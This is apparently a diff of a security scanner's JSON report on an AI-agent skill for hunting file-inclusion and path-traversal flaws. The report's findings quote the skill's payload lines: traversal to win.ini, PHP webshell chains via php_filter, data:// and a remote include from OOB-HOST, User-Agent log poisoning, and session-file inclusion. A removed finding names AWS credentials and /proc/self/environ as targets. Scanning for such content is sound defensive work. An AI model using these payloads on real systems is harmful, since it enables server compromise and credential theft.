@@ -7,13 +7,13 @@
   "description": "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path",
   "stars": 12,
   "category": "other",
-  "commit": "b89b2f59bcd776f96526ce61d77fcb9bd0821a9f",
+  "commit": "5fe45e5965f0496e535e9cac866b06e5c3e87c87",
   "contentHash": "e6b85ecc06112cac0f5302d88f485203b178e7f0ddd2dfe2b6a577fa5dbddbbb",
   "repoCreatedAt": "2026-01-19T14:28:55Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scannedAt": "2026-11-08T09:45:03.483Z",
   "scan": {
     "findings": [
       {
@@ -35,8 +35,8 @@
       {
         "ruleId": "shell",
         "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 129,
-        "excerpt": "# Windows",
+        "line": 130,
+        "excerpt": "?file=..\\..\\..\\windows\\win.ini",
         "disclosed": false,
         "automatic": false
       },
@@ -51,32 +51,24 @@
       {
         "ruleId": "shell",
         "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 147,
-        "excerpt": "# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):",
+        "line": 149,
+        "excerpt": "python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"c\"]); ?>'",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 162,
-        "excerpt": "# data:// — executes inline; REQUIRES allow_url_include=On",
+        "line": 163,
+        "excerpt": "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 176,
-        "excerpt": "# Host a payload you control, then:",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 187,
-        "excerpt": "# Step 1: inject PHP into a log the include can read",
+        "line": 177,
+        "excerpt": "?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>",
         "disclosed": false,
         "automatic": false
       },
@@ -94,8 +86,16 @@
       {
         "ruleId": "shell",
         "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 199,
-        "excerpt": "# PHP session: set payload in a stored field (username/profile), then include the session file",
+        "line": 188,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"User-Agent: <?php system(\\$_GET['c']); ?>\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity-hunt-lfi/SKILL.md",
+        "line": 200,
+        "excerpt": "?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id",
         "disclosed": false,
         "automatic": false
       },
@@ -105,14 +105,6 @@
         "line": 215,
         "excerpt": "ffuf -u \"https://$TARGET/page.php?file=FUZZ\" -w ~/wordlists/lfi.txt -mc all -fr \"not found\"",
         "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 268,
-        "excerpt": "| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |",
-        "disclosed": true,
         "automatic": false
       },
       {
@@ -127,20 +119,19 @@
       {
         "ruleId": "shell",
         "file": "skills/antigravity-hunt-lfi/SKILL.md",
-        "line": 310,
-        "excerpt": "# Read-only first step; confirm scope before anything active.",
+        "line": 311,
+        "excerpt": "cat scope.txt  # target list from the authorized engagement brief",
         "disclosed": false,
         "automatic": false
       }
     ],
     "findingTotals": {
       "shell": 11,
-      "network": 2,
-      "reads-secrets": 1
+      "network": 2
     },
-    "score": 82,
+    "score": 92,
     "band": "low",
-    "rulesVersion": "1.0.0",
+    "rulesVersion": "1.3.0",
     "filesScanned": 1,
     "filesSkipped": 0
   },
@@ -150,6 +141,12 @@
       "scannedAt": "2026-11-06T19:07:48.007Z",
       "score": 82,
       "rulesVersion": "1.0.0"
+    },
+    {
+      "commit": "5fe45e5965f0496e535e9cac866b06e5c3e87c87",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 92,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
